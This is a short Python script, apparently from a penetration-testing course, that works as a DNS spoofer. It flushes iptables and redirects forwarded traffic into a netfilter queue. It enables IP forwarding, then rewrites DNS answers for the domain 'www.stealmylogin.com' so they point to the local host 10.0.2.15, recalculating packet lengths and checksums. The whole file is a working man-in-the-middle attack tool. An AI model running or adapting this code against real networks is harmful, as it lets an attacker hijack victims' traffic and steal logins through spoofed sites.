#!usr/bin/env python
import scapy.all as scapy
import netfilterqueue
import subprocess


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        website_spoof = "www.stealmylogin.com"
        if website_spoof in qname:
            print("[+] Spoofing Target at " + website_spoof)
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()


subprocess.call("iptables --flush", shell=True)
subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)

try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[-] Closing DNS Spoofer...")
    subprocess.call("iptables --flush", shell=True)
